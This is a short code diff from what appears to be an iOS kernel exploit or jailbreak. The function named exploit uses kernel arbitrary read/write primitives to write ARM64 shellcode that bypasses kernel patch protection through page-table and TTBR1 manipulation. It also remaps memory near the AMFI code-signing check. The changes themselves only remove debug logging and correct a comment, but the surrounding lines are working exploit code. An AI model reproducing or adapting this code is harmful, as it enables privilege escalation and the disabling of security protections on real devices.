@@ -375,7 +375,6 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     copyout(level0_pte, bbuf, isvad == 0 ? 0x4000 : 0x1000);
     
     uint64_t physp = findphys_real(level0_pte);
-    NSLog(@"%llx - %llx", physp, level0_pte);
 
     
     WriteAnywhere32(shc,    0x5800019e); // ldr x30, #40
@@ -435,7 +434,7 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
         WriteAnywhere32(kppsh+n, 0xd5182021); n+=4; // msr	TTBR1_EL1, x1
         WriteAnywhere32(kppsh+n, 0x10ffffe0); n+=4; // adr	x0, #-4
         WriteAnywhere32(kppsh+n, 0xd503201f); n+=4; // nop
-        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi	vae1, x30
+        WriteAnywhere32(kppsh+n, isvad ? 0xd508871f : 0xd508873e); n+=4; // tlbi vmalle1 (4k) / tlbi	vae1, x30 (16k)
         WriteAnywhere32(kppsh+n, 0xd5033fdf); n+=4; // isb
         WriteAnywhere32(kppsh+n, 0xd65f03c0); n+=4; // ret
         WriteAnywhere64(kppsh+n, ReadAnywhere64(ttbr0_real)); n+=8;
@@ -652,12 +651,9 @@ void exploit(void* btn, mach_port_t pt, uint64_t kernbase, uint64_t allprocs)
     
     {
         uint64_t point = find_amfiret()-0x18;
-        NSLog(@"%x %x", ReadAnywhere64(point), ReadAnywhere64(NewPointer(point)));
+
         RemapPage((point & (~PMK)));
         uint64_t remap = NewPointer(point);
-        
-        NSLog(@"%llx %llx", (point), (remap));
-        NSLog(@"%x %x", ReadAnywhere32(point), ReadAnywhere32(remap));
         
         assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
         
